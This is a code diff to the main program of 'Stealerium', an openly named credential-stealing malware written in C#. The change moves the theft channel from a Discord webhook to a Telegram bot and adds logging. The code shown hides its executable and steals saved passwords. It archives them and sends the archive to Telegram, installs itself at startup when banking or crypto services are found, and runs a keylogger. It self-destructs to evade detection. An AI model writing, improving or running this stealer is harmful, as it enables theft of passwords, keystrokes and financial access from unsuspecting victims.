@@ -32,9 +32,16 @@ namespace Stealerium
             if (!Startup.IsFromStartup())
                 Startup.HideFile();
 
-            // If Discord webhook does not exists => Self destruct.
-            if (Config.Webhook.Contains("---"))
+            // If Telegram API or ID not exists => Self destruct.
+            if (Config.TelegramAPI.Contains("---") || Config.TelegramID.Contains("---"))
+            {
+                Logging.Log("SelfDestruct triggered because Telegram API or Telegram ID is invalid.");
                 SelfDestruct.Melt();
+            }
+            else
+            {
+                Logging.Log("Telegram API and ID are valid. SelfDestruct was not triggered.");
+            }
 
             // Start delay
             if (Config.StartDelay == "1")
@@ -51,16 +58,23 @@ namespace Stealerium
             // Decrypt config strings
             Config.Init();
 
-            // Test Webhook if valid
-            if (!await DiscordWebHook.WebhookIsValidAsync().ConfigureAwait(false))
+            // Test telegram API token
+            if (!await Telegram.TokenIsValidAsync().ConfigureAwait(false))
+            {
+                Logging.Log("SelfDestruct triggered because the Telegram API token is invalid.");
                 SelfDestruct.Melt();
+            }
+            else
+            {
+                Logging.Log("Telegram API token is valid. SelfDestruct was not triggered.");
+            }
 
             // Steal passwords
             var passwords = Passwords.Save();
             // Compress directory
             var archive = Filemanager.CreateArchive(passwords);
             // Send archive
-            await DiscordWebHook.SendReportAsync(archive).ConfigureAwait(false);
+            await Telegram.SendReportAsync(archive).ConfigureAwait(false);
 
             // Install to startup if enabled in config and not installed
             if (Config.Autorun == "1" && (Counter.BankingServices || Counter.CryptoServices || Counter.PornServices))
@@ -68,7 +82,7 @@ namespace Stealerium
                     Startup.Install();
 
             // Run keylogger module
-            if (Config.KeyloggerModule == "1" && Config.Autorun == "1")
+            if (Config.KeyloggerModule == "1" && (Counter.BankingServices || Counter.Telegram) && Config.Autorun == "1")
             {
                 Logging.Log("Starting keylogger modules...");
                 wThread = WindowManager.MainThread;
@@ -95,7 +109,14 @@ namespace Stealerium
 
             // Remove executable if running not from startup directory
             if (!Startup.IsFromStartup())
+            {
+                Logging.Log("SelfDestruct triggered because the program was not started from startup.");
                 SelfDestruct.Melt();
+            }
+            else
+            {
+                Logging.Log("Program started from startup. SelfDestruct was not triggered.");
+            }
         }
     }
 }
